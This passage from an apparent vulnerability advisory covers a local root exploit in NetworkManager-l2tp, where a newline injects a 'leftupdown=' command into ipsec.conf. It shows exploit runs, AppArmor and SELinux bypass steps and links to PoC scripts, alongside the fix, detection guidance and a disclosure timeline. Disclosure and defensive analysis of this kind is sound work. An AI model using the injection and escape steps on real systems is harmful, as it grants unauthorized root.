$ python3 nm-l2tp-inject.py 
[+] connection added:     /org/freedesktop/NetworkManager/Settings/45
[+] connection activated: /org/freedesktop/NetworkManager/ActiveConnection/45
[+] uuid: 7125d999-046a-47e1-9071-f2bb3e64b526
```

Check our /tmp/ipsec-out2.txt:

```bash
$ cat /tmp/ipsec-out2.txt
uid=0(root) gid=0(root) groups=0(root)
unconfined
...
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
```

The `leftupdown` exec gives us `00000000200534e2` and the systemd unit gets us to `000001ffffffffff`.

Unconfined root with full caps. 

### AppArmor "enforcing"

Normally, this is where I would research and document an escape. In this case, I will document why one is not needed.

On my test `Ubuntu 26.04 LTS` system, both `network-manager` and `network-manager-l2tp` ship without an AppArmor profile. So those two are unconfined already.

The only relevant profiles that exist are from strongswan: `usr.lib.ipsec.charon` (from strongswan-charon) and `usr.lib.ipsec.stroke` (from strongswan-starter).

But those profiles do not impact our exploit or post-exploitation work. `charon` is what fires our script and its profile which is somewhat locked down in terms of what files it can read. The daemon is running with an enforcing profile (one of very few things that are):

```bash
$ cat /proc/$(pgrep charon)/attr/current
/usr/lib/ipsec/charon (enforce)
```

But if you read its profile in `/etc/apparmor.d/usr.lib.ipsec.charon` it has this line:

```
/{,usr/}bin/dash                 rmPUx,
```

`PUx` is giving permission to execute that binary and it will try to transition into a profile for that binary if one exists, otherwise run it unconfined. There's no `dash` profile on Ubuntu, so it falls back to unconfined. So we are allowed to run a shell, and by running that shell we transition out of the relatively confined charon profile to an unconfined one. Ok.

I guess we're done here, escape complete.

Out of the scope of this article, but it's interesting that across my entire Ubuntu 26 test system a total of 16 processes out of ~254 are running under any level of confinement:

```bash
$ sudo aa-status | grep process
16 processes have profiles defined.
16 processes are in enforce mode.

$ ps auxw | wc -l
254
```

The rest are running unconfined, on an AppArmor "enforcing" system.

## SUSE + SELinux

SUSE SLES 16 and openSUSE Leap 16 are an interesting combination of the previous - pulls strongswan by default for the ipsec daemon and it runs SELinux. nm-l2tp will talk to whatever ipsec daemon you have installed.

So on a SUSE system you have the added difficulty of needing a responder to satisfy strongswan, and the added challenge of SELinux. Not a problem.

Starting as a user_u confined user without any group membership:

```bash
$ id
uid=1001(k) gid=1001(k) groups=1001(k) context=user_u:user_r:user_t:s0
```

Stage the payload at /tmp/x.sh, apply the label with `chcon -t container_file_t /tmp/x.sh` covered in the Fedora/RHEL section.

Run the [Go responder](#poc) laid out in the Ubuntu/Debian section where I cover strongswan.

Fire the [injection PoC](#poc), you land in the same `ipsec_mgmt_t` domain covered under Fedora/RHEL.

On my openSUSE Leap 16.0 test system, this is the /tmp/ipsec-out.txt from my payload firing:

```bash
$ cat /tmp/ipsec-out.txt 
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:ipsec_mgmt_t:s0
...
CapPrm: 00000000202534e2
CapEff: 00000000202534e2
CapBnd: 00000000202534e2
```

root, ipsec_mgmt_t, but look at the caps:

```bash
$ capsh --decode="00000000202534e2"
0x00000000202534e2=cap_dac_override,cap_kill,cap_setgid,cap_setuid,cap_net_bind_service,cap_net_admin,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_sys_admin,cap_audit_write
```

We gained `cap_sys_admin` which strongswan did not have on my Ubuntu system. Very powerful capability to have, SELinux will constrain it heavily though.

So on SUSE here you land in `ipsec_mgmt_t` with the larger strongSwan capabilities. SELinux greatly confines what you can do with all the capabilities so we still need an escape.

Use an SELinux escape technique from my [confined root is still root](/posts/confined-root-is-still-root/) research that applies to SUSE (there are several).

Replace the /tmp/x.sh payload with the [activation-pull.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/activation-pull.sh) escape.

Fire the exploit again. Check our /tmp/service.out-* file:

```bash 
$ ls /tmp/service.out-*
/tmp/service.out-17883600818369

$ cat /tmp/service.out-17883600818369 
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
CapInh: 0000000000000000
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000
```

Unconfined root with full caps.

## The fix

I reported it to the maintainer on 15 June 2026, cc'ing Red Hat Product Security. He replied within the hour to discuss further. The fix commit landed six days later, on 21 June:

```c
static gboolean
string_contains_control_char(const char *value)
{
    if (!value)
        return FALSE;

    for (const char *p = value; *p; p++) {
        if (g_ascii_iscntrl(*p))
            return TRUE;
    }

    return FALSE;
}
```

called from the `G_TYPE_STRING` case of `validate_one_property` - the same place the vpnc fix went eight years earlier. 

Running the exploit now results in a syslog entry:

```
Aug 27 05:49:58 rhel10-server NetworkManager[1254]: <warn>  [1787824198.6969] vpn[0x55b434a70540,ce2e244a-99bc-417f-beb6-f7f1f9e6ae22,"linnemanlabs-poc"]: failed to connect: 'property 'ipsec-ike' contains a control character'
```

NetworkManager still stores and shares it raw, it is up to the consumer to check at entry points.

The maintainer then shipped it to five stable branches over five days: 1.0.16 (28 June), 1.2.22 (29 June), 1.8.10 (30 June), 1.20.24 (1 July), 1.52.4 (2 July) and pushed them to the various distro testing repos. Good work, especially for a single-maintainer project.

## Distro Versions

Checked on 8-31-2026 reading the packaged source to not miss a distro backporting without bumping versions:

| Distribution | Version | Control-character guard |
| - | - | - |
| Fedora 43 / 44 | 1.52.4 | present |
| Debian sid / forky | 1.52.4-1 | present |
| Ubuntu 26.04 LTS | 1.52.0-2 (universe) | absent |
| Debian trixie (stable) | 1.20.20-2 | absent |
| Debian bookworm | 1.20.8-1 | absent |

The fixed 1.20.24 exists so the 1.20.x-era distributions can take it. Debian testing and unstable did pick up 1.52.4 in July. The stable branch, and Ubuntu 26.04, did not.

The fix shipped before it had a CVE. Now that a CVE exists that should change.

## Defending (or Hiding)

Detection side may be more useful to review historic logs.

### Mitigation

Not going too deep here, patches are publicly available, update your system.

Check if you have it installed with `dpkg -l network-manager-l2tp` or `rpm -q NetworkManager-l2tp`.

If it's there and you don't use L2TP VPNs, removing the package removes the vulnerability entirely and it is an optional package.

### Detection

Useful to know on the defender side and to be quieter on the attacker side.

A profile added via `AddConnection` is persistent and writes a configuration under `/etc/NetworkManager/system-connections/`. Escaped control characters showing up in a file under that path is suspicious, `leftupdown` appearing in ipsec-* is also suspicious.

There are also writes to `/run/nm-l2tp-<uuid>/ipsec.conf` for each activation that should contain only the options the plugin generates, and `leftupdown=` is suspicious there as are control characters. There is an in-memory `AddAndActivateConnection2` path that skips the persistent `/etc` NetworkManager keyfile, so don't rely on it. The runtime config is the more reliable place to look.

File integrity monitoring on `/run/nm-l2tp-*/` with the string `leftupdown=` in it is a pretty simple and effective detection for this PoC.

There is a cleanup function `real_disconnect()` that unlinks the tmp files and rmdirs `/run/nm-l2tp-<uuid>/` - but only on a clean disconnect of an established connection. The libreswan PoC doesn't fully establish and the strongSwan ones tear down before a clean disconnect fires `real_disconnect()`. So the `/run/nm-l2tp-<uuid>/` directories stay until reboot or manual deletion.

For the `AddAndActivateConnection2()` method, any value of `persist=` other than `volatile` creates a NetworkManager `.nmconnection` keyfile under `/run/NetworkManager/system-connections/`, which can be detected and checked for the suspicious patterns.

| Directory | File | Scan Filters | When Written |
|---|---|---|---|
| `/run/nm-l2tp-<uuid>/` | ipsec.conf | leftupdown= | All paths create this |
| `/run/NetworkManager/system-connections/` | `<name>.nmconnection` | leftupdown=, any escaped control character | AddAndActivateConnection2() with persist=memory |
| `/etc/NetworkManager/system-connections/` | `<name>.nmconnection` | leftupdown=, any escaped control character | AddConnect(), AddAndActivateConnection2() with persist=disk |

The /run directory is the consistent place to catch this. For that to be robust, you would want to map out all of the other security-sensitive options in addition to leftupdown that can appear in ipsec.conf, and what settings influence the kl2tpd.conf + ppp-options that also get generated. Outside of the scope of this article.

For pattern analysis, it's relatively easy to fingerprint: a system D-Bus call is made from a user, `/run/nm-l2tp-<uuid>/ipsec.conf` is created, `ipsec` gets executed, `/run/nm-l2tp-<uuid>/ipsec.conf` gets read, the ipsec daemon execs a shell. Could go a lot deeper on this but the article is long enough.

## Timeline

One of the quickest to reply and most engaged maintainers I have worked with - thanks Douglas Kosovic.

| | |
|-|-|
| 06-15-2026 | Disclosed to maintainer and RedHat PSIRT |
| 06-15-2026 | Maintainer replies within an hour with ideas |
| 06-21-2026 | Fix commit lands in repo |
| 06-28-2026 | Updated versions released for each branch over following few days |
| 07-03-2026 | Maintainer confirms all versions are being distributed |
| 08-12-2026 | CVE-2026-19624 issued by RedHat |

## PoC

PoCs are up on the [LinnemanLabs Advisories GitHub](https://github.com/linnemanlabs/advisories/).

| PoC | Purpose |
|-|-|
| [nm-l2tp-inject.py](https://github.com/linnemanlabs/advisories/blob/main/poc/nm-l2tp/nm-l2tp-inject.py) | add profile, connect, exploit |
| [nm-l2tp-responder.go](https://github.com/linnemanlabs/advisories/blob/main/poc/nm-l2tp/nm-l2tp-responder.go) | Go IKE responder (needed for strongswan) |

I am using 127.0.0.2 in the PoC because 127.0.0.0/8 is entirely loopback - the kernel routes any 127.x to lo. The vpn conn is `left=127.0.0.1 right=127.0.0.2` and since `right=` is not a locally bound address it gets treated as a remote peer. Another benefit is there is no external traffic to be detected by upstream network monitoring.

### Clean-up

If you are using the responder PoC that does not fully establish connections, there will be leftover files in `/run/nm-l2tp-<uuid>/`, remove them with:

```bash
$ sudo rm -rf /run/nm-l2tp-*
```

The exploit creates new NetworkManager connection profiles each run, their lifetime varies by method used. Remove them with:

```bash
$ nmcli -t -f UUID,NAME connection show | awk -F ':' '$2=="linnemanlabs-poc"{print $1}' | xargs -r -n1 nmcli connection delete
```

Run nmcli from the same local login session.

## tl;dr

- NetworkManager-l2tp wrote `ipsec-ike` values into a root-parsed `ipsec.conf` with no escaping
- A newline in that value injects an arbitrary directive. `leftupdown=<cmd>` is a command the ipsec daemon runs as root
- The whole attack is one D-Bus call, operates on your own profile, works from an unprivileged local user
- SELinux enforcing doesn't prevent it, it forces execution through a shell plus a readable script label (container_file_t)
- SELinux post-exploitation lands in `ipsec_mgmt_t` which we have several routes to escape to unconfined root with full caps
- AppArmor enforcing does not prevent the exploit or any post-exploitation work, trivial escape to unconfined root with full caps
- [confined root is still root](/posts/confined-root-is-still-root/)
- CVE-2026-19624, fixed in 1.52.4 / 1.20.24 / 1.8.10 / 1.2.22 / 1.0.16

## Closing Thoughts

Another example of the "confined root is still root" theme when it comes to SELinux targeted policy.

SELinux continues to be one of the most under-discussed and under-rated but widely distributed tools in my opinion. SUSE migrated from AppArmor. Will Debian/Ubuntu?

I have not done deep enough research into AppArmor to have a strong opinion on it, but it has never provided more than a small inconvenience in any exploits I have written.

The most interesting part is that the fix existed, in the same source tree, in two neighbouring plugins, one of them for eight years. No one told the nm-l2tp maintainer when they fixed the 2 adjacent CVEs 6 years apart.

Also interesting that the vulnerable plugin was reachable through a daemon whose own code I could not break.

---
